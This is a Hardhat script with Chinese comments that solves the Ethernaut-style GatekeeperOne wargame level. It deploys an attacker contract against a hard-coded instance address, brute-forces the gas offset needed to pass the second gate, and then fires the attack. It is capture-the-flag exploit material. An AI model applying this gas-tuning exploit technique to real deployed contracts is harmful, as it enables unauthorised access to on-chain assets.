import hre from "hardhat";
const { ethers } = hre;

async function deploy_GatekeeperOneTest() {
    const Contract = await ethers.getContractFactory("GatekeeperOneTest");
    const contract = await Contract.deploy();
    await contract.waitForDeployment();
      
    console.log("GatekeeperOneTest Contract deployed to: ", await contract.getAddress());
    return contract; // return the deployed contract
}

async function deploy_GatekeeperOne() {
    const Contract = await ethers.getContractFactory("GatekeeperOne");
    const contract = await Contract.deploy();
    await contract.waitForDeployment();
      
    console.log("GatekeeperOne Contract deployed to: ", await contract.getAddress());
    return contract; // return the deployed contract
}

async function deploy_GatekeeperOneAttacker(address) {
    const Contract = await ethers.getContractFactory("GatekeeperOneAttacker");
    const contract = await Contract.deploy(address);
    await contract.waitForDeployment();
      
    console.log("GatekeeperOneAttacker Contract deployed to: ", await contract.getAddress());
    return contract; // return the deployed contract
}

async function main() {
    const [signer] = await ethers.getSigners();
    console.log("我的帳戶地址 : ", signer.address);
    /*
    // ======================================= 第一階段攻擊，得到神秘數字之後可以註解掉
    // 部屬 gatekeeperOneTest 用於精算 Gate2 需要通過的 gas 是多少
    const gatekeeperOneTest = await deploy_GatekeeperOneTest();
    const gatekeeperOneAttacker = await deploy_GatekeeperOneAttacker(await gatekeeperOneTest.target);
    
    console.log("目前的 gatekeeperOneTest successTwo: ", await gatekeeperOneTest.successTwo());
    console.log("進攻...");
    
    for (let i = 2000; i < 3000; i++) {
        console.log("第 ", i, " 次進攻...");
        const gasToUse = 8191*10+i;
        const tx = await gatekeeperOneAttacker.attack(gasToUse,{ gasLimit: 1000000 });
        // console.log("tx: ", tx);
        const receipt = await tx.wait();
        // console.log("receipt: ", receipt);
        console.log("目前的 gatekeeperOneTest successTwo: ", await gatekeeperOneTest.getSuccessTwo());
    }
    
    // 得到答案，423
    // ========================================
    */
    
    // 部屬 gatekeeperOne 用於精算 Gate2 需要通過的 gas 是多少
    // 精算完 gas 後，會得到神秘數字 gasToUse，在用於進攻 gate3
    const gatekeeperOne_address = "0x627c259e948CA7a63A1fE7A82a70D7F3C1482A86";
    const gatekeeperOne = await ethers.getContractAt("GatekeeperOne", gatekeeperOne_address);
    const gatekeeperOneAttacker = await deploy_GatekeeperOneAttacker(gatekeeperOne_address);

    console.log("gatekeeperOne 關卡實例地址: ", await gatekeeperOne.target);
    console.log("目前的 gatekeeperOne entrant: ", await gatekeeperOne.entrant());

    console.log("所使用的 gateKey : ", await gatekeeperOneAttacker.gateKey());
    console.log("目前的 gatekeeperOneAttacker gasOffset: ", await gatekeeperOneAttacker.gasOffset());
    console.log("目前的 gatekeeperOneAttacker result: ", await gatekeeperOneAttacker.result());
    console.log("目前的 gatekeeperOneAttacker looptime: ", await gatekeeperOneAttacker.looptime());
    

    const gasToUse = 8191*3;
    try {
        console.log("發送交易... gasToUse = ", gasToUse);
        const tx = await gatekeeperOneAttacker.attack(gasToUse,{ gasLimit: 10000000 });
        console.log("tx: ", tx);

        const receipt = await tx.wait();
        console.log("交易成功 receipt: ", receipt);
    } catch (error) {
        console.log("error: ", error);
        console.log("Error message:", error.message);
    }
    
    console.log("攻擊後 gatekeeperOneAttacker looptime: ", await gatekeeperOneAttacker.looptime());
    console.log("攻擊後 gatekeeperOneAttacker result: ", await gatekeeperOneAttacker.result());
    console.log("攻擊後 gatekeeperOneAttacker gasOffset: ", await gatekeeperOneAttacker.gasOffset());
    console.log("攻擊後，目前的 gatekeeperOne entrant: ", await gatekeeperOne.entrant());

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });